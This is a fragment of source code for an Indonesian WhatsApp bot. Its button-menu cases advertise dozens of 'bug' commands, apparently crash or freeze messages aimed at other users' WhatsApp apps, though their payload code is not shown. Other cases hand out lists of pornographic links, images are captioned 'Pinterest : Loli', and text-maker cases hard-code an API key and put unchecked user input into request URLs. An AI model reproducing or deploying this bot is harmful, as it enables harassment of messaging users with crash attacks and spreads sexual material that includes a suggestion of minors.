case 'bugmenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
══{*VIRGAM NEW*}══
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}assalamualaikum
┣❏🔥➥ ${prefix}kal
┗━━⊱
┏━━⊱ 
══{*NGE EVAL BUG*}══
┗━━⊱
┏━━⊱
┣❏🔥➥ > sendTroli
┣❏🔥➥ > hwgans
┣❏🔥➥ > kalot
┣❏🔥➥ > kalkal
┗━━⊱
┏━━⊱ 
══{*BUG BOT*}══
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}hwmods
┣❏🔥➥ ${prefix}kalpd
┣❏🔥➥ ${prefix}xmyo
┣❏🔥➥ ${prefix}hwkal
┣❏🔥➥ ${prefix}kalbe
┣❏🔥➥ ${prefix}xmbro
┣❏🔥➥ ${prefix}hay
┣❏🔥➥ ${prefix}hello
┣❏🔥➥ ${prefix}psp
┣❏🔥➥ ${prefix}kalhw
┣❏🔥➥ ${prefix}pcp
┣❏🔥➥ ${prefix}slowh
┣❏🔥➥ ${prefix}kontul
┣❏🔥➥ ${prefix}pvp
┣❏🔥➥ ${prefix}nomoradmin
┣❏🔥➥ ${prefix}xhiro
┣❏🔥➥ ${prefix}doc1
┣❏🔥➥ ${prefix}doc2
┣❏🔥➥ ${prefix}doc3
┣❏🔥➥ ${prefix}doc4
┣❏🔥➥ ${prefix}gananya
┣❏🔥➥ ${prefix}ahnob
┣❏🔥➥ ${prefix}hwyekan
┣❏🔥➥ ${prefix}kalong
┣❏🔥➥ ${prefix}wewe
┣❏🔥➥ ${prefix}bugbutton
┣❏🔥➥ ${prefix}buglink
┣❏🔥➥ ${prefix}p [Troli]
┣❏🔥➥ ${prefix}gifbug
┣❏🔥➥ ${prefix}xmnih <philips hw>
┣❏🔥➥ ${prefix}xmfake <philips hw fake>
┣❏🔥➥ ${prefix}hw1
┣❏🔥➥ ${prefix}hw2 <philips hw>
┣❏🔥➥ ${prefix}hw3 <philips hw fake>
┣❏🔥➥ ${prefix}jadislayer
┣❏🔥➥ ${prefix}kadal
┣❏🔥➥ ${prefix}onlinedong
┣❏🔥➥ ${prefix}jaditempe <phlips hw musik>
┣❏🔥➥ ${prefix}jadigila <video>
┣❏🔥➥ ${prefix}jaditoge <sticker>
┣❏🔥➥ ${prefix}jaditahu <gambar/sticker>
┣❏🔥➥ ${prefix}jadicireng <gambar/sticker>
┣❏🔥➥ ${prefix}lokas
┣❏🔥➥ ${prefix}lokas2
┣❏🔥➥ ${prefix}buggc
┣❏🔥➥ ${prefix}bugtext <jumlah>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - THANKS YOU -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
JANGAN PAKE SEMBARANGAN
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// LIST KODE +18
case 'kodekeras':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkN2CkuI0Ra5pjBRiJDaW0CC-Wd9HUPFI-TnTDW3rkYy.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "090qnz/i+SxRxHNUztQwjfxmL7XAMiAyL6Kw7aBMIHw=",
						"fileLength": "44782",
						"height": 740,
						"width": 640,
						"mediaKey": "euwj3NlkbZ+B0E67HIzwb8isEogbcPogdFJCllUbdjA=",
						"fileEncSha256": "aDzE4IikU5jH87beKM2eUtPgnTwQIqbNGYsMCoYKnsg=",
						"mediaKeyTimestamp": "1633022751"
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
Note : EASY MODE = Sange, Biasa Aja, Mental Lemah :v
==============================
MEDIUM MODE = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
HARD MODE = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - EASY MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MEDIUM MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - HARD MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/

══{*BONUS COK*}══
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// LIST +18
case 'mausange':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkN2CkuI0Ra5pjBRiJDaW0CC-Wd9HUPFI-TnTDW3rkYy.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "090qnz/i+SxRxHNUztQwjfxmL7XAMiAyL6Kw7aBMIHw=",
						"fileLength": "44782",
						"height": 740,
						"width": 640,
						"mediaKey": "euwj3NlkbZ+B0E67HIzwb8isEogbcPogdFJCllUbdjA=",
						"fileEncSha256": "aDzE4IikU5jH87beKM2eUtPgnTwQIqbNGYsMCoYKnsg=",
						"mediaKeyTimestamp": "1633022751"
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!! - AWAS SANGE -
┏━━⊱
┣❏🔥➥ VPN* : https://duit.cc/h16JuG\n
┣❏🔥➥ NO VPN* : https://duit.cc/f2UQey7\n
┣❏🔥➥ XNXX VPN* : https://duit.cc/0lA52Gz\n
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NEKOPOI VERSION -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}nekopoi1
▢🔥➥ ${prefix}nekopoi2
▢🔥➥ ${prefix}nekopoi3
▢🔥➥ ${prefix}nekopoi4
▢🔥➥ ${prefix}nekopoi5
▢🔥➥ ${prefix}nekopoi6
▢🔥➥ ${prefix}nekopoi7
▢🔥➥ ${prefix}nekopoi8
▢🔥➥ ${prefix}nekopoi9

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// MAKER MENU
case 'makermenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}nickff
▢🔥➥ ${prefix}tahta
▢🔥➥ ${prefix}halloween
▢🔥➥ ${prefix}codetxt
▢🔥➥ ${prefix}vampire
▢🔥➥ ${prefix}matrix
▢🔥➥ ${prefix}googletxt
▢🔥➥ ${prefix}spiderman
▢🔥➥ ${prefix}express
▢🔥➥ ${prefix}dance
▢🔥➥ ${prefix}blackbird
▢🔥➥ ${prefix}warrior
▢🔥➥ ${prefix}text3d
▢🔥➥ ${prefix}neon2
▢🔥➥ ${prefix}wolf
▢🔥➥ ${prefix}tfire
▢🔥➥ ${prefix}ytgold
▢🔥➥ ${prefix}wall
▢🔥➥ ${prefix}ytsilver
▢🔥➥ ${prefix}t3d
▢🔥➥ ${prefix}attp
▢🔥➥ ${prefix}logoa
▢🔥➥ ${prefix}marvel
▢🔥➥ ${prefix}leavest
▢🔥➥ ${prefix}pornhub
▢🔥➥ ${prefix}glow
▢🔥➥ ${prefix}summer
▢🔥➥ ${prefix}flower
▢🔥➥ ${prefix}burn
▢🔥➥ ${prefix}quote
▢🔥➥ ${prefix}wooden
▢🔥➥ ${prefix}maker2d4
▢🔥➥ ${prefix}maker2d3
▢🔥➥ ${prefix}maker2d2
▢🔥➥ ${prefix}golden
▢🔥➥ ${prefix}transformer
▢🔥➥ ${prefix}maker3d4
▢🔥➥ ${prefix}maker3d3
▢🔥➥ ${prefix}maker3d2
▢🔥➥ ${prefix}maker3d
▢🔥➥ ${prefix}neon
▢🔥➥ ${prefix}coffeecup2
▢🔥➥ ${prefix}googletxt
▢🔥➥ ${prefix}coffeecup
▢🔥➥ ${prefix}battlefield
▢🔥➥ ${prefix}pinterest
▢🔥➥ ${prefix}pornhub
▢🔥➥ ${prefix}phy 
- shadow
- glitch
- coffecup
- neon
- wanted`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NULIS RANDOM -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}nulis1
▢🔥➥ ${prefix}nulis2
▢🔥➥ ${prefix}nulis3
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break	
case 'makerkal':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}darkjokes
▢🔥➥ ${prefix}image
▢🔥➥ ${prefix}pinterest
▢🔥➥ ${prefix}fix
▢🔥➥ ${prefix}cat
▢🔥➥ ${prefix}karakter
▢🔥➥ ${prefix}bird
▢🔥➥ ${prefix}koala
▢🔥➥ ${prefix}meme
▢🔥➥ ${prefix}memeindo
▢🔥➥ ${prefix}jokes`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NULIS RANDOM -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break	
case 'asupanboy':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

AWW :V
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `ASUPAN`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `ASUPAN2`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
//=================================================//                    
case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
					case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
